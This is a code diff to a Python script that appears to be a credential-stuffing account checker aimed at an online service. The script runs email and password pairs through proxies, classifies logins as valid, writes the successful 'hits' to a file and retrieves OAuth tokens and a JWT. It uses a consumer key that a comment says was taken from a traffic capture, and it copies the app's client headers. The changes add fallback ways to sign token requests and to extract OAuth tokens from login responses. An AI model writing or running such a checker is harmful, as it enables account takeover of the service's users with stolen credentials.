@@ -19,6 +19,8 @@ from urllib.parse import parse_qs
 # =========================================================
 
 CONSUMER_KEY = "als57b6d9bfbd8041.16892809"
+# Capture Reqable (getToken OK) : als57b6d9b235e084.77233595 — la paire doit
+# correspondre à CONSUMER_SECRET ; si getToken reste "ko", essayez cette clé.
 CONSUMER_SECRET = "TON_CONSUMER_SECRET"
 
 INVALID_MESSAGE = "Email, pseudo ou mot de passe invalide"
@@ -159,10 +161,11 @@ GET_TOKEN_HEADERS = {
     "Accept": "application/json",
     "X-CLIENT-VERSION": "26.1.5",
     "Accept-Charset": "UTF-8",
-    "Accept-Encoding": "gzip, deflate, br",
+    "Accept-Encoding": "deflate;q=1.0,gzip;q=0.9",
     "Accept-Language": "fr-FR,fr;q=0.9",
     "User-Agent": COMMON_HEADERS["User-Agent"],
     "Connection": "keep-alive",
+    "Priority": "u=3, i",
 }
 
 # =========================================================
@@ -259,35 +262,104 @@ LOGIN_URL = (
 _STATUS_OK_RE = re.compile(r'"status"\s*:\s*"ok"')
 
 
-def fetch_get_token_jwt(session, oauth_token, oauth_token_secret):
-    extra = {"realm": GET_TOKEN_URL}
-    auth_header = build_oauth_header(
-        method="GET",
-        url=GET_TOKEN_URL,
-        consumer_key=CONSUMER_KEY,
-        consumer_secret=CONSUMER_SECRET,
-        token=oauth_token,
-        token_secret=oauth_token_secret,
-        extra_params=extra,
-    )
-    headers = GET_TOKEN_HEADERS.copy()
-    headers["Authorization"] = auth_header
-
-    response = session.get(GET_TOKEN_URL, headers=headers)
-    raw = response.text or ""
-
-    jwt = None
-    if response.status_code == 200 and raw:
+def extract_oauth_from_login_body(text):
+    if not text or not text.strip():
+        return None, None
+    stripped = text.strip()
+    if stripped.startswith("{"):
         try:
-            data = json.loads(raw)
+            data = json.loads(text)
         except json.JSONDecodeError:
             data = None
-        if isinstance(data, dict) and data.get("status") == "ok":
-            t = data.get("data")
-            if isinstance(t, str) and t.startswith("eyJ"):
-                jwt = t
+        if isinstance(data, dict):
 
-    return jwt, response.status_code, raw
+            def walk(o):
+                if isinstance(o, dict):
+                    ot = o.get("oauth_token") or o.get("oauthToken")
+                    os_ = o.get("oauth_token_secret") or o.get("oauthTokenSecret")
+                    if (
+                        isinstance(ot, str)
+                        and isinstance(os_, str)
+                        and ot
+                        and os_
+                    ):
+                        return ot, os_
+                    for v in o.values():
+                        r = walk(v)
+                        if r[0] is not None:
+                            return r
+                elif isinstance(o, list):
+                    for item in o:
+                        r = walk(item)
+                        if r[0] is not None:
+                            return r
+                return None, None
+
+            a, b = walk(data)
+            if a is not None:
+                return a, b
+    try:
+        parsed = parse_qs(text)
+        ot = (parsed.get("oauth_token") or [None])[0]
+        os_ = (parsed.get("oauth_token_secret") or [None])[0]
+        if ot and os_:
+            return ot, os_
+    except Exception:
+        pass
+    return None, None
+
+
+def _parse_get_token_payload(raw):
+    if not raw:
+        return None, None
+    try:
+        data = json.loads(raw)
+    except json.JSONDecodeError:
+        return None, None
+    if not isinstance(data, dict):
+        return None, None
+    status = data.get("status")
+    jwt = None
+    if status == "ok":
+        t = data.get("data")
+        if isinstance(t, str) and t.startswith("eyJ"):
+            jwt = t
+    return status, jwt
+
+
+def fetch_get_token_jwt(session, oauth_token, oauth_token_secret):
+    strategies = (
+        (None, "sans realm dans la signature (comme Reqable)"),
+        ({"realm": GET_TOKEN_URL}, "avec realm=URL dans la signature"),
+    )
+
+    last_status, last_raw = 0, ""
+
+    for extra_params, _ in strategies:
+        auth_header = build_oauth_header(
+            method="GET",
+            url=GET_TOKEN_URL,
+            consumer_key=CONSUMER_KEY,
+            consumer_secret=CONSUMER_SECRET,
+            token=oauth_token,
+            token_secret=oauth_token_secret,
+            extra_params=extra_params,
+        )
+        headers = GET_TOKEN_HEADERS.copy()
+        headers["Authorization"] = auth_header
+
+        response = session.get(GET_TOKEN_URL, headers=headers)
+        raw = response.text or ""
+        last_status, last_raw = response.status_code, raw
+
+        status, jwt = _parse_get_token_payload(raw)
+        if jwt:
+            return jwt, response.status_code, raw
+        if status == "ko" and extra_params is None:
+            continue
+        break
+
+    return None, last_status, last_raw
 
 
 def fetch_request_token(session):
@@ -418,9 +490,12 @@ def process_account(email, password, proxy_url, stats, hit_writer):
         )
         kind = classify_login_response(response)
         if kind == "valid":
-            _jwt, gt_status, gt_body = fetch_get_token_jwt(
-                session, oauth_token, oauth_token_secret
-            )
+            lo_t, lo_s = extract_oauth_from_login_body(response.text or "")
+            if lo_t and lo_s:
+                ot, ots = lo_t, lo_s
+            else:
+                ot, ots = oauth_token, oauth_token_secret
+            _jwt, gt_status, gt_body = fetch_get_token_jwt(session, ot, ots)
             print_get_token_source(email, gt_status, gt_body)
             hit_writer.append_hit(email, password)
             stats.record("valid")
